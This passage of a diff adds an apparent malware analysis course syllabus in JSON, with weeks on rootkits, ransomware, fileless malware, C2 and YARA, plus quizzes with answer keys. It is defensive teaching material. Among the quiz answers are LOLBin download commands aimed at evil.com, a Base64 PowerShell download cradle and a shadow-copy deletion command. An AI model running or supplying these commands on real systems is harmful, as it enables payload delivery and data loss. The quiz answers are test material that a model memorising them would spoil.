+            "value": "pslist walks the ActiveProcessLinks list (OS view). psscan scans raw memory for EPROCESS structures (bypasses DKOM). Discrepancy = hidden processes."
+          },
+          {
+            "key": "Secure Boot Bypass",
+            "value": "BlackLotus (2023) exploited a signed bootloader vulnerability. BYOVD uses legitimate vulnerable drivers to load unsigned rootkit code."
+          },
+          {
+            "key": "BYOVD Technique",
+            "value": "Attackers include a legitimately signed but vulnerable driver, exploit it for kernel write, load their rootkit. Bypasses driver signature enforcement."
+          },
+          {
+            "key": "Firmware Rootkit Persistence",
+            "value": "UEFI rootkits in SPI flash survive OS reinstall, disk formatting, and disk replacement. Removal requires SPI chip reflashing."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 10,
+      "session_number": 10,
+      "topic": "Ransomware Analysis",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Analyze ransomware encryption: key generation, file targeting, and encryption workflow",
+        "Identify ransomware families from ransom notes, extensions, and encryption patterns",
+        "Evaluate key recovery possibilities based on cryptographic implementation flaws",
+        "Map ransomware behavior to MITRE ATT&CK for detection engineering"
+      ],
+      "readings": [
+        "Practical Malware Analysis supplements on ransomware",
+        "No More Ransom project: Decryptor documentation",
+        "CISA, #StopRansomware advisory series (selected)"
+      ],
+      "lecture_notes": {
+        "introduction": "Ransomware is the most impactful malware category with $20B+ annual damages. Understanding encryption implementation determines whether recovery is possible without paying. Well-implemented ransomware (AES per file, RSA-wrapped keys, CryptGenRandom) is unrecoverable. Flawed implementations (single AES key, predictable RNG seed, partial encryption) may allow key recovery. This lecture covers technical analysis of ransomware encryption and detection before encryption completes.",
+        "key_concepts": [
+          "Encryption workflow: enumerate drives, identify target files by extension, generate keys, encrypt, drop ransom note, delete shadow copies",
+          "Hybrid encryption: random AES key per file (fast), RSA/ECC wraps each AES key (only attacker's private key decrypts)",
+          "Key generation flaws: rand() instead of CryptGenRandom, GetTickCount seed (32-bit, brute-forcible), reusing AES key across files",
+          "Partial encryption: some ransomware encrypts only the first 1MB for speed, leaving rest recoverable",
+          "Shadow copy deletion: vssadmin delete shadows /all /quiet prevents Windows system restore",
+          "Ransomware families: LockBit (intermittent encryption), BlackCat (Rust, cross-platform), Conti (leaked source code)",
+          "Detection: mass file renaming, shadow copy deletion, high CPU + disk I/O pattern",
+          "Ransom notes: Tor URLs, Bitcoin/Monero addresses, victim IDs",
+          "No More Ransom: free decryptors for families with known key recovery methods"
+        ],
+        "demonstration": "Analyze a ransomware sample through static (file enumeration imports, encryption functions), dynamic (ProcMon showing file encryption, shadow copy deletion, C2 beacon), and debug analysis (break on key generation to assess recovery feasibility).",
+        "setup_requirements": [
+          "FlareVM with ransomware sample (defanged for lab)",
+          "ProcMon and x64dbg",
+          "Test files for encryption observation",
+          "VM snapshot for restoration"
+        ],
+        "review": [
+          {
+            "key": "Encryption Speed Trade-off",
+            "value": "LockBit 3.0 encrypts 4KB per 16KB (intermittent encryption) for speed. More data recoverable but files still unusable."
+          },
+          {
+            "key": "WannaCry Key Recovery",
+            "value": "CryptGenKey left prime numbers in memory. WanaKiwi recovered them to reconstruct keys. Only worked if machine had not rebooted."
+          },
+          {
+            "key": "Pre-Encryption Detection",
+            "value": "File share enumeration, shadow copy deletion, disabling Windows Defender, mass file access patterns. EDR can detect and kill before encryption begins."
+          },
+          {
+            "key": "Conti Source Leak",
+            "value": "2022 leak enabled analysis of ChaCha20 encryption, network scanning, and C2 protocol. Source code leaks are goldmines for analysts."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 11,
+      "session_number": 11,
+      "topic": "Fileless Malware and Living-off-the-Land Binaries",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Identify fileless malware techniques that avoid writing to disk",
+        "Analyze PowerShell, WMI, and .NET-based malware delivery and execution",
+        "Catalog Living-off-the-Land Binaries and their malicious use cases",
+        "Develop detection strategies using process monitoring and script logging"
+      ],
+      "readings": [
+        "LOLBAS Project: Living Off The Land Binaries, Scripts, and Libraries",
+        "Mandiant, Fileless Malware: A Definition and Analysis",
+        "Microsoft, PowerShell Logging and Detection whitepaper"
+      ],
+      "lecture_notes": {
+        "introduction": "Fileless malware executes in memory using legitimate system tools, evading file-based detection. LOLBins (certutil, mshta, regsvr32, bitsadmin, PowerShell) are trusted executables abused for malicious purposes. WMI persistence uses event subscriptions for code execution. .NET Assembly.Load executes compiled code from byte arrays without disk writes. Analyzing fileless attacks requires PowerShell script block logging, Sysmon event monitoring, and ETW tracing.",
+        "key_concepts": [
+          "Fileless execution: PowerShell in-memory, .NET Assembly.Load, reflective DLL injection",
+          "PowerShell download cradle: IEX (New-Object Net.WebClient).DownloadString() for in-memory execution",
+          "LOLBins: certutil (download), mshta (HTA execution), regsvr32 (COM scriptlet), bitsadmin (download), rundll32 (DLL execution)",
+          "WMI persistence: EventFilter + CommandLineEventConsumer + FilterToConsumerBinding",
+          "Reflective DLL injection: loads DLL from memory without LoadLibrary, avoiding disk writes",
+          ".NET in-memory: Assembly.Load(byte[]) loads compiled C# from a byte array",
+          "AMSI (Antimalware Scan Interface): scans PowerShell and .NET before execution",
+          "AMSI bypass: patching AmsiScanBuffer in memory, obfuscation to evade scanning",
+          "Detection: PowerShell script block logging (Event ID 4104), Sysmon process creation (Event ID 1), WMI events (19-21)"
+        ],
+        "demonstration": "Analyze a fileless attack: VBA macro executes encoded PowerShell, which downloads C# payload executed via Assembly.Load, establishing C2 via WMI persistence. Analyze each stage: decode PowerShell, capture .NET payload from script block logs, decompile with dnSpy.",
+        "setup_requirements": [
+          "FlareVM with PowerShell script block logging enabled",
+          "dnSpy for .NET decompilation",
+          "Sysmon for enhanced logging",
+          "Sample fileless attack chain"
+        ],
+        "review": [
+          {
+            "key": "PowerShell Logging",
+            "value": "Event ID 4104 logs full content of every PowerShell script, even obfuscated ones. The most valuable log source for PowerShell attacks."
+          },
+          {
+            "key": "LOLBin Detection",
+            "value": "Monitor command lines: certutil with -urlcache (download), mshta with URL (remote execution), regsvr32 with /i:http:// (remote scriptlet)."
+          },
+          {
+            "key": "WMI Persistence Detection",
+            "value": "Sysmon Events 19-21 log WMI event filter/consumer/binding creation. Query: Get-WmiObject -Namespace root/subscription -Class __EventConsumer."
+          },
+          {
+            "key": "AMSI Effectiveness",
+            "value": "AMSI catches known patterns but sophisticated attackers bypass via patching or obfuscation. Defense in depth (logging + behavioral detection) supplements AMSI."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 12,
+      "session_number": 12,
+      "topic": "Script-Based Malware: PowerShell, VBA, and JavaScript",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Deobfuscate malicious PowerShell scripts using manual and automated techniques",
+        "Analyze VBA macros in Office documents for malicious behavior",
+        "Examine JavaScript-based malware and HTML smuggling delivery",
+        "Extract IoCs and execution chains from script-based malware"
+      ],
+      "readings": [
+        "Practical Malware Analysis supplements on script analysis",
+        "SANS, Deobfuscating Malicious PowerShell reference",
+        "olevba and oletools documentation"
+      ],
+      "lecture_notes": {
+        "introduction": "Script malware uses trusted interpreters (PowerShell, wscript, cscript, mshta) for initial access. Attackers heavily obfuscate scripts using string concatenation, Base64 encoding, character substitution, and nested encoding. VBA macros in Office documents are a primary delivery method. JavaScript malware uses HTML smuggling to construct and download payloads at runtime. The analysis workflow: identify language and entry point, peel obfuscation layers one at a time, extract core functionality, identify IoCs.",
+        "key_concepts": [
+          "PowerShell obfuscation: -EncodedCommand (Base64), string concatenation, backtick escaping, variable substitution, IEX wrapping",
+          "PowerShell deobfuscation: replace IEX with Write-Output to safely reveal decoded commands",
+          "VBA analysis: oletools/olevba extracts macros, Auto_Open for auto-execution, Shell/WScript.Shell for commands",
+          "VBA obfuscation: Chr() for character-by-character strings, Environ for path resolution, CallByName for indirect calls",
+          "JavaScript malware: WSH executes .js via wscript.exe, ActiveXObject for file/network access",
+          "HTML smuggling: JavaScript constructs binary blob at runtime, bypassing web filters",
+          "Multi-stage: macro downloads PowerShell which downloads executable, each stage adds obfuscation",
+          "CyberChef: chain decode operations (Base64, XOR, gunzip) for multi-layer deobfuscation",
+          "Safe analysis: use Write-Output instead of Invoke-Expression, analyze in isolated VM"
+        ],
+        "demonstration": "Analyze multi-stage phishing: extract VBA macro with olevba, decode Base64 PowerShell, deobfuscate download URL, capture second stage from FakeNet-NG, deobfuscate final payload, extract all IoCs.",
+        "setup_requirements": [
+          "oletools for Office macro extraction",
+          "PowerShell ISE for safe analysis",
+          "CyberChef for deobfuscation",
+          "FlareVM with FakeNet-NG"
+        ],
+        "review": [
+          {
+            "key": "Safe PowerShell Deobfuscation",
+            "value": "Replace IEX with Write-Output before running. Prints decoded command instead of executing. Repeat for multi-layer encoding until final payload is revealed."
+          },
+          {
+            "key": "VBA Red Flags",
+            "value": "Auto_Open macros, Shell/WScript.Shell calls, PowerShell in strings, Chr() chains, URLDownloadToFile imports."
+          },
+          {
+            "key": "JavaScript Deobfuscation",
+            "value": "Replace dynamic execution calls with output/echo to reveal decoded code. Tools like box-js emulate WSH for automatic deobfuscation."
+          },
+          {
+            "key": "HTML Smuggling",
+            "value": "JavaScript constructs binary file from embedded data and triggers download. No malicious file crosses the network. Detect via Blob API monitoring in browser telemetry."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 13,
+      "session_number": 13,
+      "topic": "Command-and-Control Communication Analysis",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Identify and analyze C2 protocols: HTTP, DNS, HTTPS, and custom protocols",
+        "Extract C2 addresses, encryption keys, and protocol structure from malware",
+        "Detect C2 traffic using network metadata and behavioral indicators",
+        "Map C2 techniques to MITRE ATT&CK for detection signatures"
+      ],
+      "readings": [
+        "Practical Malware Analysis, Ch. 14 (Networking)",
+        "MITRE ATT&CK: Command and Control (TA0011)",
+        "Mudge, Cobalt Strike Malleable C2 documentation"
+      ],
+      "lecture_notes": {
+        "introduction": "C2 communication is the attacker's lifeline to compromised systems. Understanding C2 protocols is critical for extraction of IoCs and network defense. HTTP/HTTPS C2 is most common because web traffic is universally allowed. DNS C2 encodes data in query subdomains. Cobalt Strike is the most common C2 framework. Analysis involves capturing traffic, identifying patterns (beaconing), reverse engineering protocol structure, extracting encryption keys, and developing detection signatures.",
+        "key_concepts": [
+          "Beaconing: periodic C2 check-in, interval typically 60-3600 seconds with jitter to avoid detection",
+          "HTTP C2: beacon as GET/POST, commands in response body, legitimate-looking URLs and user-agents",
+          "HTTPS C2: encrypted, certificate info may reveal C2 (self-signed, recently issued)",
+          "DNS C2: data encoded in subdomain labels and TXT records, bypasses firewalls allowing DNS",
+          "Domain fronting: traffic appears to connect to legitimate CDN but routes to attacker's server",
+          "Cobalt Strike: most common C2 framework, malleable profiles customize traffic appearance",
+          "C2 encryption: AES or XOR, key may be hardcoded (extractable) or derived from DH exchange",
+          "Network IoCs: IPs, domains, URL patterns, JA3 fingerprints, HTTP header patterns, certificate fingerprints",
+          "Domain Generation Algorithms: pseudo-random domain names generated daily, detected by high-entropy NXDOMAIN queries"
+        ],
+        "demonstration": "Analyze C2 communication: run sample with FakeNet-NG, identify beaconing pattern, capture encrypted request body, reverse engineer encryption in Ghidra (XOR with 16-byte key in .data), decrypt captured traffic revealing beacon data and tasking commands. Extract all IoCs.",
+        "setup_requirements": [
+          "FlareVM with FakeNet-NG",
+          "Wireshark for PCAP analysis",
+          "Ghidra for C2 protocol reverse engineering",
+          "Python for decryption scripts"
+        ],
+        "review": [
+          {
+            "key": "Beaconing Detection",
+            "value": "Calculate inter-connection time standard deviation per destination. Low StdDev relative to interval = beaconing. Normal traffic has high variance."
+          },
+          {
+            "key": "Cobalt Strike Detection",
+            "value": "Default JA3 fingerprint, default certificate (Major Cobalt Strike), default URL patterns. Custom profiles change these but operators often miss some defaults."
+          },
+          {
+            "key": "DNS Tunneling Bandwidth",
+            "value": "DNS queries carry approximately 200 bytes in subdomains. At 10 queries/second that is roughly 2KB/s. Sufficient for C2 commands but too slow for bulk exfiltration."
+          },
+          {
+            "key": "DGA Detection",
+            "value": "Monitor for NXDOMAIN responses to high-entropy domains. DGA domains have distinctive statistical properties (high entropy, unusual length distribution)."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 14,
+      "session_number": 14,
+      "topic": "YARA Rules and Detection Signatures",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Write YARA rules for malware detection, classification, and threat hunting",
+        "Develop signatures from analysis findings: unique strings, byte patterns, behavioral indicators",
+        "Test YARA rules against clean file corpora to minimize false positives",
+        "Integrate YARA rules into scanning pipelines"
+      ],
+      "readings": [
+        "YARA documentation: Writing YARA rules",
+        "VirusTotal Hunting: YARA rule deployment",
+        "Elastic, YARA Signature Development Best Practices"
+      ],
+      "lecture_notes": {
+        "introduction": "YARA is the standard pattern-matching language for malware detection and classification. Rules combine text strings, hex byte patterns, regular expressions, PE module features, and file characteristics into detection conditions. The art is selecting patterns specific enough to avoid false positives but general enough to catch variants. YARA rules are the primary output of malware analysis: they translate findings into automated detection deployable across security infrastructure.",
+        "key_concepts": [
+          "Rule structure: rule name { meta: strings: condition: }",
+          "Text strings: exact match with nocase/wide/ascii modifiers",
+          "Hex strings: byte patterns with ?? wildcards for unknown bytes",
+          "Hex jumps: variable-length gaps between pattern fragments [4-8]",
+          "Regular expressions: match patterns across variants",
+          "PE module: pe.imports(), pe.sections[].entropy for PE-specific conditions",
+          "Condition operators: any of, N of, filesize constraints, uint16(0) == 0x5A4D for PE check",
+          "False positive testing: scan against clean file corpus before deployment",
+          "Deployment: local scanning, VirusTotal Hunting retrohunt, SIEM/EDR integration"
+        ],
+        "demonstration": "Write YARA rules from analysis findings: rule for ransomware (mutex, ransom note pattern, extension), rule for C2 protocol (XOR key bytes, beacon URL, user-agent), generic process injection rule (API imports + PE characteristics). Test all against clean corpus and malware samples.",
+        "setup_requirements": [
+          "YARA 4.x installed",
+          "Malware sample collection for true positive testing",
+          "Clean file corpus for false positive testing",
+          "VirusTotal account for retrohunt"
+        ],
+        "review": [
+          {
+            "key": "Rule Specificity",
+            "value": "A rule matching one API name alone hits many legitimate programs. Add specificity: require the API PLUS a suspicious string PLUS unusual PE characteristics. Each condition reduces false positives."
+          },
+          {
+            "key": "Hex Patterns from Disassembly",
+            "value": "Extract bytes from Ghidra for unique code patterns. Use ?? wildcards for register-dependent operands that vary per build."
+          },
+          {
+            "key": "Rule Maintenance",
+            "value": "Malware evolves. Monitor rule performance. Increasing false negatives signal pattern shifts. Update rules when new variants are analyzed."
+          },
+          {
+            "key": "YARA Performance",
+            "value": "Prefer hex strings over regex. Limit condition complexity. Use filesize constraints to skip non-target files early. Well-optimized rules scan at roughly 100MB/s."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 15,
+      "session_number": 15,
+      "topic": "Malware Analysis Report Capstone",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Write a professional malware analysis report with all required sections",
+        "Extract and format IoCs for sharing via STIX/TAXII",
+        "Map all findings to MITRE ATT&CK with evidence references",
+        "Present findings and defend methodology to a technical audience"
+      ],
+      "readings": [
+        "SANS, Writing Malware Analysis Reports guide",
+        "STIX 2.1 specification overview",
+        "MITRE ATT&CK mapping best practices"
+      ],
+      "lecture_notes": {
+        "introduction": "The value of malware analysis is realized through clear, actionable reporting and intelligence sharing. A professional report must communicate to multiple audiences: executives need threat severity and business impact, SOC analysts need detection signatures and IoCs, incident responders need behavioral indicators, and threat intelligence teams need ATT&CK mapping. The standard structure covers executive summary, static/dynamic/code analysis, IoCs, ATT&CK mapping, and detection recommendations. IoCs formatted in STIX enable automated sharing via TAXII. This capstone session covers report writing and presents the final analysis synthesizing all course skills.",
+        "key_concepts": [
+          "Report structure: executive summary, malware overview, static analysis, dynamic analysis, code analysis, IoCs, ATT&CK mapping, detection recommendations",
+          "Executive summary: 1 paragraph with malware type, severity, capabilities, immediate actions for non-technical stakeholders",
+          "Evidence standards: every claim supported by screenshot, log excerpt, or code reference; reproducible steps",
+          "IoC formatting: file hashes, network indicators (IPs, domains, URLs), host indicators (paths, registry keys, mutexes)",
+          "STIX 2.1: standardized threat intelligence objects in JSON (malware, indicator, attack-pattern, relationship)",
+          "TAXII: transport protocol for sharing STIX objects between organizations",
+          "MITRE ATT&CK mapping: technique ID, name, and evidence reference for each observed behavior",
+          "Detection recommendations: YARA rules, Snort/Suricata rules, SIEM correlation rules",
+          "Report audience: executive summary for management, details for analysts, IoCs for automation, YARA for detection engineering"
+        ],
+        "demonstration": "Present a complete analysis report for the capstone sample. Walk through each section with evidence. Demonstrate STIX-formatted output and discuss TAXII sharing. Peer review and methodology defense.",
+        "setup_requirements": [
+          "Analysis report template",
+          "STIX editor or Python stix2 library",
+          "MITRE ATT&CK Navigator for visualization",
+          "Capstone analysis materials"
+        ],
+        "review": [
+          {
+            "key": "Report Quality Criteria",
+            "value": "Actionable (IoCs ready for deployment), evidence-based (every claim has proof), reproducible (another analyst reaches same conclusions), multi-audience (executive, analyst, automation), shareable (STIX-formatted IoCs)."
+          },
+          {
+            "key": "ATT&CK Mapping Value",
+            "value": "Connects the sample to the broader threat landscape. Defenders can search for techniques across all telemetry, not just this sample's IoCs."
+          },
+          {
+            "key": "IoC Lifecycle",
+            "value": "File hashes change per build (days). Domains/IPs rotate (days to weeks). Behavioral indicators persist (months). YARA rules based on code patterns have the longest useful life."
+          },
+          {
+            "key": "STIX Sharing",
+            "value": "Bundles contain malware, indicator, attack-pattern, and relationship objects. Automated ingestion by SIEM, EDR, and firewall systems across participating organizations."
+          }
+        ]
+      }
+    }
+  ],
+  "assessments": {
+    "quizzes": [
+      {
+        "quiz": 1,
+        "week": 3,
+        "topic": "Static and Dynamic Analysis Techniques",
+        "duration": "20 minutes",
+        "questions": [
+          {
+            "question": "You are analyzing a suspicious executable. PEStudio shows imports: CreateToolhelp32Snapshot, Process32First, OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread. The .text section entropy is 7.8. What is the likely capability, and what does the entropy mean for your analysis approach?",
+            "type": "short_answer",
+            "points": 8,
+            "answer": "The import chain reveals classic process injection (DLL injection): CreateToolhelp32Snapshot + Process32First enumerate processes, OpenProcess opens a target, VirtualAllocEx allocates memory in the target, WriteProcessMemory writes malicious code, CreateRemoteThread executes it. The entropy of 7.8 indicates the code is packed or encrypted. The visible imports are from an unpacking stub; the actual payload imports are hidden. The analyst must unpack (identify packer with DIE, unpack appropriately) or use dynamic analysis/debugging to capture the unpacked payload from memory.",
+            "rubric": [
+              {
+                "key": "Correctly identifies process injection from import chain",
+                "value": 3
+              },
+              {
+                "key": "Explains each API's role in the injection sequence",
+                "value": 2
+              },
+              {
+                "key": "Correctly interprets high entropy and its analysis implications",
+                "value": 3
+              }
+            ]
+          },
+          {
+            "question": "During dynamic analysis, ProcMon shows: (1) CreateFile to AppData\\Roaming\\svchost.exe, (2) RegSetValue to HKCU\\...\\Run with value pointing to svchost.exe, (3) TCP Connect to 185.220.101.45:443. Interpret each behavior, provide the ATT&CK technique ID, and list IoCs to extract.",
+            "type": "short_answer",
+            "points": 8,
+            "answer": "(1) File drop mimicking legitimate process name (T1036.005 Masquerading). (2) Registry Run key persistence (T1547.001 Registry Run Keys). (3) HTTPS C2 communication (T1071.001 Application Layer Protocol: Web). IoCs: file hash of svchost.exe, path AppData\\Roaming\\svchost.exe, registry key HKCU\\...\\Run\\WindowsUpdate, IP 185.220.101.45, port 443, any resolved domain from DNS logs.",
+            "rubric": [
+              {
+                "key": "Correct interpretation of all three behaviors",
+                "value": 3
+              },
+              {
+                "key": "Correct ATT&CK technique IDs",
+                "value": 3
+              },
+              {
+                "key": "Complete IoC list",
+                "value": 2
+              }
+            ]
+          },
+          {
+            "question": "A malware sample creates mutex 'Global\\MutexRAT2024v3'. Explain the purpose, why it is a valuable IoC, and how to detect it across an enterprise.",
+            "type": "short_answer",
+            "points": 7,
+            "answer": "Purpose: prevents multiple instances from running (single-instance enforcement). IoC value: mutex names are unique to malware families, persist across recompilations, and are present in memory on every infected machine. More persistent than hashes which change per build. Detection: YARA rule matching the string, Sysmon logging of named mutex creation, SIEM rule alerting on this mutex name, Volatility mutantscan for memory forensics during incident response.",
+            "rubric": [
+              {
+                "key": "Correctly explains mutex purpose",
+                "value": 2
+              },
+              {
+                "key": "Explains why mutex names are valuable persistent IoCs",
+                "value": 3
+              },
+              {
+                "key": "Practical enterprise detection approach",
+                "value": 2
+              }
+            ]
+          }
+        ],
+        "total_points": 23
+      },
+      {
+        "quiz": 2,
+        "week": 5,
+        "topic": "Assembly and Reverse Engineering",
+        "duration": "20 minutes",
+        "questions": [
+          {
+            "question": "In Ghidra's decompiler, you see a function that reads 256 bytes from a PE resource, XORs each byte with 0x5A, calls InternetOpenUrlA with the result, reads the response into a buffer passed to CreateThread. Explain the behavior and provide steps to extract the C2 URL.",
+            "type": "short_answer",
+            "points": 8,
+            "answer": "The malware stores its C2 URL XOR-encrypted (key 0x5A) in a PE resource. At runtime: loads resource, XOR-decodes to plaintext URL, downloads second-stage payload via InternetOpenUrlA, executes downloaded code in a new thread (download-and-execute). To extract: (1) Use Resource Hacker to dump the 256-byte resource. (2) Python: decoded = bytes([b ^ 0x5A for b in resource_data]). (3) Result is the C2 URL. Alternative: break on InternetOpenUrlA in x64dbg and read the URL parameter.",
+            "rubric": [
+              {
+                "key": "Correctly identifies download-and-execute chain",
+                "value": 3
+              },
+              {
+                "key": "Correct URL extraction method",
+                "value": 3
+              },
+              {
+                "key": "Identifies execution mechanism (CreateThread)",
+                "value": 2
+              }
+            ]
+          },
+          {
+            "question": "A malware sample exits cleanly after 2 seconds in your VM without malicious activity. Name three anti-analysis checks to investigate and how to bypass each.",
+            "type": "short_answer",
+            "points": 8,
+            "answer": "Check 1: VM detection (registry keys, CPUID, MAC OUI, VM processes). Bypass: ScyllaHide, remove VMware Tools, change MAC, add realistic user files. Check 2: Sleep/timing evasion (Sleep(120000) exceeding sandbox timeout). Bypass: break on Sleep in x64dbg, change argument to 1ms. Check 3: Anti-debugging (IsDebuggerPresent, NtQueryInformationProcess, timing comparison). Bypass: ScyllaHide anti-anti-debug, manually set PEB.BeingDebugged to 0, patch conditional jumps.",
+            "rubric": [
+              {
+                "key": "Three valid anti-analysis techniques",
+                "value": 3
+              },
+              {
+                "key": "Specific practical bypass for each",
+                "value": 3
+              },
+              {
+                "key": "Technical accuracy",
+                "value": 2
+              }
+            ]
+          },
+          {
+            "question": "When would you use a hardware breakpoint instead of a software breakpoint during malware debugging? Explain the technical difference.",
+            "type": "short_answer",
+            "points": 7,
+            "answer": "Software breakpoints write INT3 (0xCC) over the target instruction, modifying code in memory. Detectable by anti-debugging that checksums code sections. Limited to execute only. Hardware breakpoints use CPU debug registers (DR0-DR3), do not modify memory, invisible to integrity checks. Limited to 4 simultaneous breakpoints but support read/write/execute triggers. Use hardware breakpoints when: malware checksums its own code, you need memory access breakpoints (break on data read/write), or in self-modifying code where software breakpoints get overwritten.",
+            "rubric": [
+              {
+                "key": "Correct technical explanation of both types",
+                "value": 3
+              },
+              {
+                "key": "Identifies detectability difference",
+                "value": 2
+              },
+              {
+                "key": "Valid scenario requiring hardware breakpoints",
+                "value": 2
+              }
+            ]
+          }
+        ],
+        "total_points": 23
+      },
+      {
+        "quiz": 3,
+        "week": 8,
+        "topic": "Anti-Analysis and Rootkits",
+        "duration": "20 minutes",
+        "questions": [
+          {
+            "question": "Explain the BYOVD technique, why it bypasses driver signing, and how to detect it.",
+            "type": "short_answer",
+            "points": 8,
+            "answer": "BYOVD uses a legitimately signed but vulnerable kernel driver. The attacker loads it (passes signing verification), exploits the vulnerability (e.g., arbitrary kernel write via IOCTL) to disable security features or load unsigned rootkit code. Detection: check loaded drivers against LOLDrivers database, monitor Sysmon Event ID 6 for driver loads from unusual paths, watch for IOCTL calls to drivers with known vulnerable IOCTLs.",
+            "rubric": [
+              {
+                "key": "Correctly explains BYOVD and signing bypass",
+                "value": 3
+              },
+              {
+                "key": "Describes exploitation steps",
+                "value": 3
+              },
+              {
+                "key": "Practical detection methods",
+                "value": 2
+              }
+            ]
+          },
+          {
+            "question": "Volatility pslist shows 45 processes but psscan finds 47. What does this indicate and what additional plugins would you use?",
+            "type": "short_answer",
+            "points": 8,
+            "answer": "DKOM: 2 processes unlinked from ActiveProcessLinks. pslist walks the linked list (OS view, 45). psscan scans raw memory for EPROCESS structures (47). Additional plugins: psxview (cross-reference methods), ssdt (hooked system calls), callbacks (notification callbacks), malfind (injected executable code), netscan (hidden network connections), driverirp (filter driver hooks), modscan vs modules (hidden kernel modules).",
+            "rubric": [
+              {
+                "key": "Correctly identifies DKOM",
+                "value": 3
+              },
+              {
+                "key": "At least 4 relevant plugins with purpose",
+                "value": 3
+              },
+              {
+                "key": "Explains what each reveals",
+                "value": 2
+              }
+            ]
+          },
+          {
+            "question": "Why is VMProtect-protected malware much harder to analyze than UPX-packed malware?",
+            "type": "short_answer",
+            "points": 7,
+            "answer": "UPX compresses code; the unpacking stub decompresses the original instructions intact. Unpacking is trivial (upx -d or breakpoint-and-dump). VMProtect converts x86 instructions into bytecode for a custom virtual machine. Original instructions are permanently destroyed. Reversing requires understanding the VM dispatcher, handler semantics, and bytecode encoding -- exponentially harder. For VMProtect, behavioral analysis (API breakpoints, dynamic monitoring) is often more practical than full code reversal.",
+            "rubric": [
+              {
+                "key": "Contrasts compression (UPX) with virtualization (VMProtect)",
+                "value": 3
+              },
+              {
+                "key": "Explains why VM protection is fundamentally harder",
+                "value": 2
+              },
+              {
+                "key": "Suggests practical alternative approach",
+                "value": 2
+              }
+            ]
+          }
+        ],
+        "total_points": 23
+      },
+      {
+        "quiz": 4,
+        "week": 11,
+        "topic": "Ransomware, Fileless Malware, and Scripts",
+        "duration": "20 minutes",
+        "questions": [
+          {
+            "question": "A ransomware sample uses CryptGenRandom for AES-256 keys. Explain why recovery is impossible. Then contrast with a sample seeding rand() with GetTickCount() and describe how to attempt recovery.",
+            "type": "short_answer",
+            "points": 8,
+            "answer": "CryptGenRandom draws from hardware entropy; each key is truly random with 2^256 possible values, unbrute-forceable. With GetTickCount() + rand(): GetTickCount is 32-bit (~4.3 billion values). Determine approximate infection time from logs, calculate tick range, for each candidate seed call srand() and generate the same key sequence, try decrypting a file with known content. Brute-forcing ~346 million seeds is feasible in minutes on modern hardware.",
+            "rubric": [
+              {
+                "key": "Explains why CryptGenRandom prevents recovery",
+                "value": 3
+              },
+              {
+                "key": "Explains GetTickCount seed space limitation",
+                "value": 3
+              },
+              {
+                "key": "Practical recovery approach for weak RNG",
+                "value": 2
+              }
+            ]
+          },
+          {
+            "question": "Deobfuscate this PowerShell: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1AC8AcwAuAHAAcwAxACcAKQA=",
+            "type": "code",
+            "points": 8,
+            "answer": "Base64 decode (UTF-16LE): IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5/s.ps1'). This is a download cradle: IEX executes the script downloaded into memory without writing to disk. ATT&CK: T1059.001 (PowerShell), T1105 (Ingress Tool Transfer). IoCs: IP 192.168.1.5, path /s.ps1. Internal IP suggests lateral movement or compromised internal host.",
+            "rubric": [
+              {
+                "key": "Correctly decodes Base64 to PowerShell",
+                "value": 3
+              },
+              {
+                "key": "Identifies download cradle behavior",
+                "value": 3
+              },
+              {
+                "key": "Provides IoCs and fileless execution note",
+                "value": 2
+              }
+            ]
+          },
+          {
+            "question": "Name three LOLBins with specific attack commands and detection strategies.",
+            "type": "short_answer",
+            "points": 7,
+            "answer": "(1) certutil.exe: certutil -urlcache -split -f http://evil.com/payload.exe C:\\Users\\Public\\payload.exe. Detect: Sysmon Event ID 1 for certutil with -urlcache. (2) mshta.exe: mshta http://evil.com/attack.hta. Detect: mshta with URL argument. (3) regsvr32.exe: regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll. Detect: regsvr32 with /i: containing URL and scrobj.dll target.",
+            "rubric": [
+              {
+                "key": "Three valid LOLBins with correct commands",
+                "value": 3
+              },
+              {
+                "key": "Commands are technically accurate",
+                "value": 2
+              },
+              {
+                "key": "Detection strategies are specific",
+                "value": 2
+              }
+            ]
+          }
+        ],
+        "total_points": 23
+      },
+      {
+        "quiz": 5,
+        "week": 14,
+        "topic": "C2 Analysis, YARA, and Reporting",
+        "duration": "20 minutes",
+        "questions": [
+          {
+            "question": "Write a YARA rule detecting a malware family with: string 'MutexRAT2024' (case-insensitive), hex pattern { 8A 06 34 ?? 88 06 46 E2 F8 } for XOR loop, PE executable under 500KB.",
+            "type": "code",
+            "points": 8,
+            "answer": "rule MutexRAT_Family {\n    meta:\n        author = \"Student\"\n        description = \"Detects MutexRAT via mutex, XOR loop, PE characteristics\"\n    strings:\n        $mutex = \"MutexRAT2024\" nocase\n        $xor_loop = { 8A 06 34 ?? 88 06 46 E2 F8 }\n    condition:\n        uint16(0) == 0x5A4D and filesize < 500KB and $mutex and $xor_loop\n}\nThe ?? wildcard matches any XOR key byte, catching all variants.",
+            "rubric": [
+              {
+                "key": "Correct YARA syntax with meta, strings, condition",
+                "value": 3
+              },
+              {
+                "key": "Proper PE check, filesize, nocase, hex wildcards",
+                "value": 3
+              },
+              {
+                "key": "Correct logical combination of all criteria",
+                "value": 2
+              }
+            ]
+          },
+          {
+            "question": "How would you detect Cobalt Strike beaconing without decrypting HTTPS? Name three network metadata indicators.",
+            "type": "short_answer",
+            "points": 8,
